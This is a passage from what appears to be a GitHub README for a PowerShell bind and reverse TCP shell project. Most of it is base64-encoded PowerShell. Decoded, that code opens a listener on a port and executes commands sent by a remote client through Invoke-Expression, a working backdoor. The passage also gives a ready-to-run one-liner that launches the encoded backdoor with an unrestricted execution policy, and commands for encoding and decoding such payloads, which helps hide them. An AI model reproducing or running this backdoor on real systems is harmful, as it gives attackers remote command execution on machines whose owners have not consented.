AIAAgACAAIAAgACAAIABiAHkAIABJAHYAYQBuACAAUwBpAG4AYwBlAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABGAGUAZQBsACAAZgByAGUAZQAgAHQAbwAgAGQAbwBuAGEAdABlACAAYgBpAHQAYwBvAGkAbgAgAGEAdAAgADEAQgByAFoATQA2AFQANwBHADkAUgBOADgAdgBiAGEAYgBuAGYAWAB1ADQATQA2AEwAcABnAHoAdABxADYAWQAxADQALgAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIgA7AA0ACgAJACQAbABpAHMAdABlAG4AZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABzAHQAcgBlAGEAbQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAGIAdQBmAGYAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAdwByAGkAdABlAHIAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABkAGEAdABhACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcgBlAHMAdQBsAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAdAByAHkAIAB7AA0ACgAJAAkAIwAgAGMAaABhAG4AZwBlACAAdABoAGUAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABhAHMAIABuAGUAYwBlAHMAcwBhAHIAeQANAAoACQAJACQAbABpAHMAdABlAG4AZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAKAAiADAALgAwAC4AMAAuADAAIgAsACAAJABwAG8AcgB0ACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AGEAcgB0ACgAKQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFcAYQBpAHQAaQBuAGcAIABmAG8AcgAgAGMAbABpAGUAbgB0ACAAdABvACAAYwBvAG4AbgBlAGMAdAAuAC4ALgAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAAkACQBkAG8AIAB7AA0ACgAJAAkACQAjACAAbgBvAG4ALQBiAGwAbwBjAGsAaQBuAGcAIABtAGUAdABoAG8AZAANAAoACQAJAAkAaQBmACAAKAAkAGwAaQBzAHQAZQBuAGUAcgAuAFAAZQBuAGQAaQBuAGcAKAApACkAIAB7AA0ACgAJAAkACQAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABUAGMAcABDAGwAaQBlAG4AdAAoACkAOwANAAoACQAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAJAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7AA0ACgAJAAkACQB9AA0ACgAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABjAGwAaQBlAG4AdAAgAC0AZQBxACAAJABuAHUAbABsACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwANAAoACQAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AA0ACgAJAAkAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAxADAAMgA0ADsADQAKAAkACQAkAGUAbgBjAG8AZABpAG4AZwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcAOwANAAoACQAJACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACgAJABzAHQAcgBlAGEAbQApADsADQAKAAkACQAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAGwAaQBlAG4AdAAgAGMAbwBuAG4AZQBjAHQAZQBkACEAIgA7AA0ACgAJAAkAJABiAHkAdABlAHMAIAA9ACAAMAA7AA0ACgAJAAkAZABvACAAewANAAoACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQAoACIAUABTAD4AIgApADsADQAKAAkACQAJAGQAbwAgAHsADQAKAAkACQAJAAkAJABiAHkAdABlAHMAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQA7AA0ACgAJAAkACQAJAGkAZgAgACgAJABiAHkAdABlAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKAAkACQAJAAkACQAkAGQAYQB0AGEAIAA9ACAAJABkAGEAdABhACAAKwAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwApADsADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABzAHQAcgBlAGEAbQAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQA7AA0ACgAJAAkACQBpAGYAIAAoACQAZABhAHQAYQAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAIAB7AA0ACgAJAAkACQAJAHQAcgB5ACAAewANAAoACQAJAAkACQAJACQAcgBlAHMAdQBsAHQAIAA9ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnADsADQAKAAkACQAJAAkAfQAgAGMAYQB0AGMAaAAgAHsADQAKAAkACQAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ASQBuAG4AZQByAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQA7AA0ACgAJAAkACQAJAH0ADQAKAAkACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAJAByAGUAcwB1AGwAdAApADsADQAKAAkACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkAGEAdABhACIAOwANAAoACQAJAAkAfQANAAoACQAJAH0AIAB3AGgAaQBsAGUAIAAoACQAYgB5AHQAZQBzACAALQBnAHQAIAAwACkAOwANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9ACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKAAkACQBpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJAB3AHIAaQB0AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcwB0AHIAZQBhAG0AIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGMAbABpAGUAbgB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABiAHUAZgBmAGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAGIAdQBmAGYAZQByAC4AQwBsAGUAYQByACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABkAGEAdABhACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAHIAZQBzAHUAbAB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgBlAHMAdQBsAHQAIgA7AA0ACgAJAAkAfQANAAoACQB9AA0ACgB9AA0ACgA=
```

Encoded script will prompt for input. See the slightly altered script in my other [project](https://github.com/ivan-sincek/invoker/blob/master/ps/powershell_bind_tcp.ps1).

**\[Bind TCP - Parameterized\]** To pass parameters to PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -Command "'9000'" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABwAG8AcgB0ACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAiACkALgBUAHIAaQBtACgAKQA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAGkAZgAgACgAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAUABvAHIAdAAgAG4AdQBtAGIAZQByACAAaQBzACAAcgBlAHEAdQBpAHIAZQBkACIAOwANAAoAfQAgAGUAbABzAGUAIAB7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAEIAaQBuAGQAIABUAEMAUAAgAHYAMQAuADEAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHkAIABJAHYAYQBuACAAUwBpAG4AYwBlAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABGAGUAZQBsACAAZgByAGUAZQAgAHQAbwAgAGQAbwBuAGEAdABlACAAYgBpAHQAYwBvAGkAbgAgAGEAdAAgADEAQgByAFoATQA2AFQANwBHADkAUgBOADgAdgBiAGEAYgBuAGYAWAB1ADQATQA2AEwAcABnAHoAdABxADYAWQAxADQALgAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIgA7AA0ACgAJACQAbABpAHMAdABlAG4AZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABzAHQAcgBlAGEAbQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAGIAdQBmAGYAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAdwByAGkAdABlAHIAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABkAGEAdABhACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcgBlAHMAdQBsAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAdAByAHkAIAB7AA0ACgAJAAkAIwAgAGMAaABhAG4AZwBlACAAdABoAGUAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABhAHMAIABuAGUAYwBlAHMAcwBhAHIAeQANAAoACQAJACQAbABpAHMAdABlAG4AZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAKAAiADAALgAwAC4AMAAuADAAIgAsACAAJABwAG8AcgB0ACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AGEAcgB0ACgAKQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFcAYQBpAHQAaQBuAGcAIABmAG8AcgAgAGMAbABpAGUAbgB0ACAAdABvACAAYwBvAG4AbgBlAGMAdAAuAC4ALgAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAAkACQBkAG8AIAB7AA0ACgAJAAkACQAjACAAbgBvAG4ALQBiAGwAbwBjAGsAaQBuAGcAIABtAGUAdABoAG8AZAANAAoACQAJAAkAaQBmACAAKAAkAGwAaQBzAHQAZQBuAGUAcgAuAFAAZQBuAGQAaQBuAGcAKAApACkAIAB7AA0ACgAJAAkACQAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABUAGMAcABDAGwAaQBlAG4AdAAoACkAOwANAAoACQAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAJAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7AA0ACgAJAAkACQB9AA0ACgAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABjAGwAaQBlAG4AdAAgAC0AZQBxACAAJABuAHUAbABsACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwANAAoACQAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AA0ACgAJAAkAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAxADAAMgA0ADsADQAKAAkACQAkAGUAbgBjAG8AZABpAG4AZwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcAOwANAAoACQAJACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACgAJABzAHQAcgBlAGEAbQApADsADQAKAAkACQAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAGwAaQBlAG4AdAAgAGMAbwBuAG4AZQBjAHQAZQBkACEAIgA7AA0ACgAJAAkAJABiAHkAdABlAHMAIAA9ACAAMAA7AA0ACgAJAAkAZABvACAAewANAAoACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQAoACIAUABTAD4AIgApADsADQAKAAkACQAJAGQAbwAgAHsADQAKAAkACQAJAAkAJABiAHkAdABlAHMAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQA7AA0ACgAJAAkACQAJAGkAZgAgACgAJABiAHkAdABlAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKAAkACQAJAAkACQAkAGQAYQB0AGEAIAA9ACAAJABkAGEAdABhACAAKwAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwApADsADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABzAHQAcgBlAGEAbQAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQA7AA0ACgAJAAkACQBpAGYAIAAoACQAZABhAHQAYQAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAIAB7AA0ACgAJAAkACQAJAHQAcgB5ACAAewANAAoACQAJAAkACQAJACQAcgBlAHMAdQBsAHQAIAA9ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnADsADQAKAAkACQAJAAkAfQAgAGMAYQB0AGMAaAAgAHsADQAKAAkACQAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ASQBuAG4AZQByAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQA7AA0ACgAJAAkACQAJAH0ADQAKAAkACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAJAByAGUAcwB1AGwAdAApADsADQAKAAkACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkAGEAdABhACIAOwANAAoACQAJAAkAfQANAAoACQAJAH0AIAB3AGgAaQBsAGUAIAAoACQAYgB5AHQAZQBzACAALQBnAHQAIAAwACkAOwANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9ACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKAAkACQBpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJAB3AHIAaQB0AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcwB0AHIAZQBhAG0AIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGMAbABpAGUAbgB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABiAHUAZgBmAGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAGIAdQBmAGYAZQByAC4AQwBsAGUAYQByACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABkAGEAdABhACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAHIAZQBzAHUAbAB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgBlAHMAdQBsAHQAIgA7AA0ACgAJAAkAfQANAAoACQB9AA0ACgB9AA0ACgA=
```

To generate a PowerShell encoded command from a PowerShell script, run the following PowerShell command:

```pwsh
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText($script)))
```

To decode a PowerShell encoded command, run the following PowerShell command:

```pwsh
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($command))
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/img/backdoor.jpg" alt="Backdoor"></p>

<p align="center">Figure 1 - Backdoor</p>

<p align="center"><img src="https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/img/listener.jpg" alt="Listener"></p>

<p align="center">Figure 2 - Listener</p>